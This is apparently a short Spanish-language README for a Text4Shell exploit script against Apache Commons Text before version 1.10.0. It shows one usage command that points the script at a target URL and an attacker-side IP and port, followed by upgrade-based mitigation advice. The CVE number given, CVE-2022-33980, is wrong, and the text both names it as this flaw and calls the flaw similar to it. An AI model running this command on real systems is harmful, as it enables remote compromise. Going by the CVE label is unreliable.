# riskootext4shell
text4shell script for text coomons &lt; =1.10 CVE-2022-33980


- La biblioteca Apache Commons Text es una librería alternativa a las funcionalidades nativas del JDK de Java . 
- Versiones previas a versión 1.10.0 de apache commons
- Similar a CVE-2022-33980

```bash
python3 text4shell.py -u http://192.168.245.111:8080/search?query= -i 192.168.111.186 -p 22
```



## Mitigación


La solución principal consiste en actualizar urgentemente el componente Apache Commons Text a las versiones disponibles que corrigen esta vulnerabilidad. Concretamente, se debe actualizar a una versión 1.10.0 o posterior de Apache Commons Text.

En esta actualización, se ha optado por deshabilitar por defecto aquellas sustituciones problemáticas. En el fichero changelog de la librería se incluye el siguiente cambio:

Make default string lookups configurable vía system property. Remove dns, url, and script lookups from defaults. If these lookups are required for use in StringSubstitutor.createInterpolator(), they must be enabled vía system property. See StringLookupFactory for details.

Desde Apache se ha publicado un comunicado con la información oficial y una referencia a la actualización en la que se corrige el problema.
